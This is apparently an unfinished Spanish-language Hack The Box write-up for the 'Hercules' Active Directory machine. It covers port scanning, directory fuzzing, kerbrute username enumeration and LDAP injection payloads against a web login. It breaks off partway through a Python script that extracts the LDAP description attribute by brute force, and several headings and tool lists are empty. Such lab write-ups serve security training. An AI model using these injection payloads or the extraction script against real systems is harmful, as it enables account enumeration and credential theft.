---
layout: single
title: Hercules - Hack The Box
excerpt: "."
date: 2025-10-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-hercules/hercules.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Insane Machine
tags:
  - Windows
  - Active Directory
  - 
  - OSCP Style
---
![](/assets/images/htb-writeup-hercules/hercules.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.91
PING 10.10.11.91 (10.10.11.91) 56(84) bytes of data.
64 bytes from 10.10.11.91: icmp_seq=1 ttl=127 time=89.9 ms
64 bytes from 10.10.11.91: icmp_seq=2 ttl=127 time=68.9 ms
64 bytes from 10.10.11.91: icmp_seq=3 ttl=127 time=69.3 ms
64 bytes from 10.10.11.91: icmp_seq=4 ttl=127 time=70.1 ms

--- 10.10.11.91 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3011ms
rtt min/avg/max/mdev = 68.932/74.532/89.861/8.859 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.91 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 16:41 CST
Initiating SYN Stealth Scan at 16:41
Scanning 10.10.11.91 [65535 ports]
Discovered open port 445/tcp on 10.10.11.91
Discovered open port 53/tcp on 10.10.11.91
Discovered open port 135/tcp on 10.10.11.91
Discovered open port 80/tcp on 10.10.11.91
Discovered open port 139/tcp on 10.10.11.91
Discovered open port 443/tcp on 10.10.11.91
Discovered open port 55376/tcp on 10.10.11.91
Discovered open port 3268/tcp on 10.10.11.91
Discovered open port 49668/tcp on 10.10.11.91
Discovered open port 5986/tcp on 10.10.11.91
Discovered open port 9389/tcp on 10.10.11.91
Discovered open port 3269/tcp on 10.10.11.91
Discovered open port 389/tcp on 10.10.11.91
Discovered open port 49664/tcp on 10.10.11.91
Increasing send delay for 10.10.11.91 from 0 to 5 due to 11 out of 36 dropped probes since last increase.
Discovered open port 54249/tcp on 10.10.11.91
Discovered open port 49681/tcp on 10.10.11.91
Discovered open port 49674/tcp on 10.10.11.91
Discovered open port 464/tcp on 10.10.11.91
Discovered open port 55403/tcp on 10.10.11.91
Discovered open port 636/tcp on 10.10.11.91
Discovered open port 88/tcp on 10.10.11.91
Discovered open port 593/tcp on 10.10.11.91
Completed SYN Stealth Scan at 16:42, 53.05s elapsed (65535 total ports)
Nmap scan report for 10.10.11.91
Host is up, received user-set (0.26s latency).
Scanned at 2025-10-24 16:41:13 CST for 53s
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49681/tcp open  unknown          syn-ack ttl 127
54249/tcp open  unknown          syn-ack ttl 127
55376/tcp open  unknown          syn-ack ttl 127
55403/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 53.15 seconds
           Raw packets sent: 262120 (11.533MB) | Rcvd: 95 (4.168KB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

<br>

Son bastantes puertos y veo algunos como el **puerto 88**, que es del **servicio Kerberos**, que nos indican que nos enfrentamos a una máquina tipo **Active Directory**.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5986,9389,49664,49668,49674,49681,54249,55376,55403 10.10.11.91 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 16:42 CST
Nmap scan report for 10.10.11.91
Host is up (0.072s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://10.10.11.91/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-24 22:42:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Hercules Corp
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         Microsoft Windows RPC
54249/tcp open  msrpc         Microsoft Windows RPC
55376/tcp open  msrpc         Microsoft Windows RPC
55403/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-24T22:43:45
|_  start_date: N/A
|_clock-skew: 3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.96 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

<br>

Gracias al escaneo, podemos notar cosillas interesantes:
* Tenemos activas dos páginas web, siendo que la página web del **puerto 80**, nos redirige a la página web activa en el **puerto 443**.
* El **servicio LDAP** nos da el dominio de la máquina.
* Vemos el **servicio WinRM** activo en el **puerto 5986**.
* Y por último, necesitaremos credenciales válidas para entrar al **servicio SMB**.

Registremos el dominio del **AD** en el `/etc/hosts`:
```bash
echo "10.10.11.91 hercules.htb dc.hercules.htb" >> /etc/hosts
```
Empezaremos nuestro análisis por las páginas web.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTPS">Analizando Servicio HTTPS</h2>

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura1.png">
</p>

Al meter la IP nos redirige a la página web del **puerto 443**.

Parece ser una página web de una empresa que crea software, aplicaciones web y móbiles, etc.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura2.png">
</p>

Lo más destacable es el uso del **servidor web IIS**, de ahí en fuera no hay más.

No hay más que podamos ver por aquí, ni en el código fuente.

Apliquemos **Fuzzing** para identificar directorios ocultos.

<br>

<h2 id="fuzz">Fuzzing</h2>

Primero usemos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://10.10.11.91/FUZZ -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.11.91/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 1789ms]
login                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 1938ms]
home                    [Status: 302, Size: 141, Words: 6, Lines: 4, Duration: 5422ms]
default                 [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 4870ms]
Home                    [Status: 302, Size: 141, Words: 6, Lines: 4, Duration: 4084ms]
content                 [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 4952ms]
Default                 [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 5210ms]
Login                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 1050ms]
Index                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 1755ms]
Content                 [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 1846ms]
INDEX                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 1063ms]
HOME                    [Status: 302, Size: 141, Words: 6, Lines: 4, Duration: 294ms]
                        [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 878ms]
DEFAULT                 [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 756ms]
LogIn                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 633ms]
LOGIN                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 670ms]
:: Progress: [220545/220545] :: Job [1/1] :: 482 req/sec :: Duration: [0:08:30] :: Errors: 0 ::
```

| Parámetros | Descripción |
|--------------------------|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

<br>

Ahora probemos con **gobuster**:
```bash
gobuster dir -u https://10.10.11.91 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -k
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.11.91
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 27342]
/login                (Status: 200) [Size: 3213]
/home                 (Status: 302) [Size: 141] [--> /Login?ReturnUrl=%2fhome]
/content              (Status: 301) [Size: 151] [--> https://10.10.11.91/content/]
/default              (Status: 200) [Size: 27342]
/Home                 (Status: 302) [Size: 141] [--> /Login?ReturnUrl=%2fHome]
/Default              (Status: 200) [Size: 27342]
/Index                (Status: 200) [Size: 27342]
/Login                (Status: 200) [Size: 3213]
/Content              (Status: 301) [Size: 151] [--> https://10.10.11.91/Content/]
/INDEX                (Status: 200) [Size: 27342]
/HOME                 (Status: 302) [Size: 141] [--> /Login?ReturnUrl=%2fHOME]
/DEFAULT              (Status: 200) [Size: 27342]
/LogIn                (Status: 200) [Size: 3213]
/LOGIN                (Status: 200) [Size: 3213]
Progress: 220544 / 220544 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

<br>

De entre todos los directorios que descubrimos, vemos uno que es un login:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura3.png">
</p>

Ahí vemos un icono que al darle clic, nos dará un mensaje:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura4.png">
</p>

Entonces, aplicar fuerza bruta no es una buena opción, pues podemos bloquear este login por X cantidad de tiempo.

Enumeremos otros servicios.

<br>

<h2 id="kerberos">Enumeración de Servicio Kerberos</h2>

Para aplicar la enumeración, utilizaremos la herramienta **kerbrute**:
* <a href="https://github.com/ropnop/kerbrute" target="_blank">Repositorio de ropnop: kerbrute</a>

Vamos a enumerar los usuarios existentes:
```bash
/kerbrute_linux_386 userenum --dc 10.10.11.91 -d hercules.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 200

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/24/25 - Ronnie Flathers @ropnop

2025/10/24 19:21:34 >  Using KDC(s):
2025/10/24 19:21:34 >  	10.10.11.91:88

2025/10/24 19:21:35 >  [+] VALID USERNAME:	 admin@hercules.htb
2025/10/24 19:21:49 >  [+] VALID USERNAME:	 administrator@hercules.htb
2025/10/24 19:21:50 >  [+] VALID USERNAME:	 Admin@hercules.htb
2025/10/24 19:23:26 >  [+] VALID USERNAME:	 Administrator@hercules.htb
2025/10/24 19:26:09 >  [+] VALID USERNAME:	 auditor@hercules.htb
2025/10/24 19:32:53 >  [+] VALID USERNAME:	 ADMIN@hercules.htb
2025/10/24 21:34:30 >  [+] VALID USERNAME:	 will.s@hercules.htb
```
Después de dejarlo bastante tiempo corriendo, obtenemos un usuario que nos da una pista de la sintaxis para el nombre de los usuarios que están utilizando, siendo el nombre del usuario y una letra (supongo que es de su apellido).

Entonces, vamos a crear un wordlist que tenga nombre de usuarios, pero siguiendo esta sintaxis.

Utilizaremos como plantilla el wordlist `/usr/share/wordlists/seclists/Usernames/Names/names.txt`, ya que solo contiene nombre reales de personas:
```bash
awk 'NF{ for(i=97;i<=122;i++) printf "%s.%c\n", $0, i }' /usr/share/wordlists/seclists/Usernames/Names/names.txt > names_ad.txt

wc -l names_ad.txt
264602 names_ad.txt
```
Ya tenemos nuestro wordlist.

Solo expliquemos rapidamente este comando:
* **NF** evita líneas vacías. 
* El bucle `i=97..122` imprime `nombre.<letra>` usando el **código ASCII**.

Utilicemos este wordlist y veamos cuantos usuarios podemos obtener:
```bash
./kerbrute_linux_386 userenum --dc 10.10.11.91 -d hercules.htb names_ad.txt -t 150

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/24/25 - Ronnie Flathers @ropnop

2025/10/24 17:02:57 >  Using KDC(s):
2025/10/24 17:02:57 >  	10.10.11.91:88

2025/10/24 17:03:21 >  [+] VALID USERNAME:	 adriana.i@hercules.htb
2025/10/24 17:04:23 >  [+] VALID USERNAME:	 angelo.o@hercules.htb
2025/10/24 17:08:03 >  [+] VALID USERNAME:	 ashley.b@hercules.htb
2025/10/24 17:09:48 >  [+] VALID USERNAME:	 bob.w@hercules.htb
2025/10/24 17:10:31 >  [+] VALID USERNAME:	 camilla.b@hercules.htb
2025/10/24 17:11:53 >  [+] VALID USERNAME:	 clarissa.c@hercules.htb
2025/10/24 17:14:38 >  [+] VALID USERNAME:	 elijah.m@hercules.htb
2025/10/24 17:15:54 >  [+] VALID USERNAME:	 fiona.c@hercules.htb
2025/10/24 17:17:36 >  [+] VALID USERNAME:	 harris.d@hercules.htb
2025/10/24 17:17:42 >  [+] VALID USERNAME:	 heather.s@hercules.htb
2025/10/24 17:18:43 >  [+] VALID USERNAME:	 jacob.b@hercules.htb
2025/10/24 17:19:23 >  [+] VALID USERNAME:	 jennifer.a@hercules.htb
2025/10/24 17:19:34 >  [+] VALID USERNAME:	 jessica.e@hercules.htb
2025/10/24 17:19:49 >  [+] VALID USERNAME:	 joel.c@hercules.htb
2025/10/24 17:19:49 >  [+] VALID USERNAME:	 johanna.f@hercules.htb
2025/10/24 17:19:50 >  [+] VALID USERNAME:	 johnathan.j@hercules.htb
2025/10/24 17:21:07 >  [+] VALID USERNAME:	 ken.w@hercules.htb
2025/10/24 17:24:21 >  [+] VALID USERNAME:	 mark.s@hercules.htb
2025/10/24 17:25:22 >  [+] VALID USERNAME:	 mikayla.a@hercules.htb
2025/10/24 17:26:18 >  [+] VALID USERNAME:	 nate.h@hercules.htb
2025/10/24 17:26:21 >  [+] VALID USERNAME:	 natalie.a@hercules.htb
2025/10/24 17:27:35 >  [+] VALID USERNAME:	 patrick.s@hercules.htb
2025/10/24 17:28:35 >  [+] VALID USERNAME:	 ramona.l@hercules.htb
2025/10/24 17:28:42 >  [+] VALID USERNAME:	 ray.n@hercules.htb
2025/10/24 17:28:56 >  [+] VALID USERNAME:	 rene.s@hercules.htb
2025/10/24 17:30:43 >  [+] VALID USERNAME:	 shae.j@hercules.htb
2025/10/24 17:31:51 >  [+] VALID USERNAME:	 stephanie.w@hercules.htb
2025/10/24 17:31:53 >  [+] VALID USERNAME:	 stephen.m@hercules.htb
2025/10/24 17:32:26 >  [+] VALID USERNAME:	 tanya.r@hercules.htb
2025/10/24 17:33:03 >  [+] VALID USERNAME:	 tish.c@hercules.htb
2025/10/24 17:34:00 >  [+] VALID USERNAME:	 vincent.g@hercules.htb
2025/10/24 17:34:25 >  [+] VALID USERNAME:	 will.s@hercules.htb
2025/10/24 17:35:03 >  [+] VALID USERNAME:	 zeke.s@hercules.htb
2025/10/24 17:35:10 >  Done! Tested 264602 usernames (33 valid) in 1932.819 seconds
```
Excelente, tenemos bastantes usuarios.

Guarda solo el resultado en un archivo de texto y de este, obtendremos los usuarios completos y solo los nombres de los usuarios:
```bash
# Obteniendo los usuarios completos
sed -n 's/.*VALID USERNAME:[[:space:]]*\([^[:space:]]*\).*/\1/p' resultadoKer.txt > full_users.txt

# Obteniendo solo los nombres de los usuarios
sed -n 's/.*VALID USERNAME:[[:space:]]*\([^@[:space:]]*\)@.*/\1/p' resultadoKer.txt > only_names.txt
```
Muy bien, estos wordlists nos pueden servir para más adelante.

<br>

<h2 id="login">Análisis de Login de Página Web del Puerto 443</h2>

La idea es identificar si es posible que podamos abusar de este login, siendo la principal el ver como trata la data que le damos.

Captura un intento de sesión con **BurpSuite** y envía la captura al **Repeater**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura5.png">
</p>

Algo muy común en ambientes **AD** es utilizar el **servicio LDAP** como metodo de autenticación en otros servicios/protocolos.

Posiblemente este login utilice **LDAP** para la autenticación.

Podemos aplicar **inyecciones LDAP** para confirmar no solo si se usa **LDAP** en el login, sino que podemos explotarlo para tratar de ganar acceso.

Vamos a probarlo.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="LDAP">Aplicando Inyecciones LDAP en Login</h2>

Para que podamos entender como funcionan las **Inyecciones LDAP**, primero debemos saber como es que se contruyen las consultas en **LDAP**, que son conocidas como **Filtros LDAP**:

| **Filtro LDAP** |
|:---------------:|
| *Un filtro LDAP es una expresión entre paréntesis que indica qué entradas del directorio deben coincidir. Es análogo a la cláusula WHERE de SQL, pero con su propia sintaxis.* |

<br>

Esta es la sintaxis que se utiliza: `(<atributo><operador><valor>)`.

Para el caso de los atributos, te dejo un link que muestra una lista con los **nombres de atributos LDAP** que se utilizan en un **AD**:
* <a href="https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html" target="_blank">List of LDAP Attribute Names and Associated Name in Active Directory</a>

De acuerdo a esta lista, posiblemente el filtro que se ocupe en el login, sea alguno de estos:
```bash
(cn=will.s*)(password=contraseña)
(sAMAccountName=will.s*)(description=a*)
```

Podemos tratar de aplicar inyecciones para obtener la contraseña, pero tenemos que tomar en cuenta la **sintaxis RFC 4545**:

| **Sintaxis RFC 4545** |
|:---------------------:|
| *El RFC 4515 define la sintaxis para una representación en cadena legible por humanos de los filtros de búsqueda LDAP, que se incluyen entre paréntesis y se estructuran utilizando operadores como & (AND), | (OR), ! (NOT) y operadores de comparación (por ejemplo, =). Los filtros pueden ser simples, como (cn=John Doe), o complejos, combinando varias condiciones, como (&(uid=test)(|(cn=John)(cn=Jane))). Los caracteres especiales dentro de los valores de los filtros deben escaparse con una barra invertida seguida del valor hexadecimal de dos dígitos del carácter, (por ejemplo, splat(asterisco) se convierte en \2a.* |

<br>

Es posible que tengamos que aplicar codificaciones para que las inyecciones funcionen.

Ahora sí, ¿Qué son las **Inyecciones LDAP**?

| **Inyecciones LDAP** |
|:--------------------:|
| *Una inyección LDAP es una vulnerabilidad que ocurre cuando una aplicación construye consultas o filtros LDAP concatenando datos del usuario sin validarlos ni escaparlos. Si un atacante introduce caracteres o fragmentos de filtro maliciosos, puede alterar la consulta LDAP que el servidor ejecuta y así filtrar, enumerar, eludir autenticación o en algunos casos extraer información sensible. En vez de pasar un username limpio al filtro LDAP, la aplicación inserta el valor tal cual y eso permite que el atacante cambie la semántica del filtro.* |

<br>

Entonces, debemos enfocar las inyecciones en el parámetro **username**.

Nuestro objetivo es descubrir, cuál de todos los usuarios que hemos capturado es valido para este login.

Aquí te dejo un par de blogs que tienen payloads para **Inyecciones LDAP**:
* <a href="https://www.verylazytech.com/ldap-injection" target="_blank">LDAP Injection</a>
* <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/LDAP%20Injection/" target="_blank">Payloads All The Things: LDAP Injection</a>

Como prueba, usare el siguiente payload:
```bash
*(
)
)(
)(!(
)(!(&(|
```

Utiliza la captura que ya tienes en el **Repeater** de **BurpSuite**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura6.png">
</p>

Obtenemos un **invalid username**.

Esto como tal no nos dice nada, solo que es posible el uso de **LDAP** en el login.

Vamos a enfocar la inyección para identificar ya sea el atributo **password** o **description**.

Utiliza el siguiente payload:
```bash
will.s)(password=*
will.s)(description=*
```

Luego codificamos 2 veces los operadores lógicos para evitar cualquier validación en los **filtros LDAP**, quedando de la siguiente manera:
```bash
will.s%252a%2529%2528password%253d%252a
will.s%252a%2529%2528description%253d%252a
```

Aplica cualquiera de los dos:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura7.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura8.png">
</p>

Observa que en ambos casos, nos da el mensaje que el intento de login es fallido, por lo que el usuario lo toma como valido.

Esto nos indica que en efecto, se esta utilizando el **servicio LDAP** para este login.

Al igual que con las **Inyecciones SQL**, podemos tratar de aplicar fuerza bruta para obtener el contenido del atributo **password o description**, esto funcionaria porque:
* Tenemos una forma de validar si la inyección fue exitosa, siendo el mensaje **Invalid login attempt** el indicador de exito.
* En la inyección, utilizariamos varios caracteres para saber cual es valido, siendo así que dumpeariamos el contenido de cualquier atributo.
* La mejor opción sería utilizar el atributo **description**, ya que puede contener información privilegiada por error.

La inyección sería la siguiente:
```bash
<usuario1>)(description=<caracter1>*
...
<usuario2>)(description=<caracter1>*
...
```
Y así sucecivamente.

El problema es que sería tardado ir de usuario por usuario, probando si la inyección nos permite obtener el contenido de este atributo.

Automatizaremos este proceso usando un script de **Python**:
```bash
#!/usr/bin/env python3
import requests, re, signal, pdb, time, sys, urllib3, string
from termcolor import colored
from pwn import *

# Salida
def def_handler(sig, frame):
        print(colored(f"\n\n[!] Saliendo...\n", 'red'))
        sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Deshabilitando advertencias de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Variables globales
main_url = "https://hercules.htb"
loginPATH = "/Login"
loginPage = "/login"
target = main_url + loginPATH
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + '!@#$_*-.' + "%^&()=+[]{}|;:',<>?/`~\" \\"
verify_TLS = False
success = "Login attempt failed"
Resp_token = re.compile(r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"', re.IGNORECASE)

# Usuarios encontrados
KerbUsers = [
        "auditor", "adriana.i", "angelo.o", "ashley.b", "bob.w", "camilla.b", "clarissa.c", "elijah.m", "fiona.c", "harris.d", "heather.s", "jacob.b", "jennifer.a", "jessica.e", "joel.c", ">
]


# Obteniendo token y cookies
def get_token_and_cookie(session):
        response = session.get(main_url + loginPage, verify=verify_TLS)

        token = None
        match = Resp_token.search(response.text)
        if match:
                token = match.group(1)
        return token

# Aplicando Injecciones LDAP
def ldapInjection(username, description_prefix=""):
        session = requests.Session()

        # Obteniendo Token
        token = get_token_and_cookie(session)
        if not token:
                return False

        # Contruyendo payload para LDAP Injection
        if description_prefix:
                escaped_desc = description_prefix
                escaped_desc = escaped_desc.replace('*', '\\2a').replace('(', '\\28').replace(')', '\\29')

                # PAYLOAD
                payload = f"{username}*)(description={escaped_desc}*"

        else:
                payload = f"{username}*)(description=*"

        # Codificación URL doble
        encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))

        data = {
                "Username": encoded_payload,
                "Password": "test",
                "RememberMe": "false",
                "__RequestVerificationToken": token
        }

        try:
                response = session.post(target, data=data, verify=verify_TLS, timeout=5)
                return success in response.text

        except Exception as e:
                return False
    
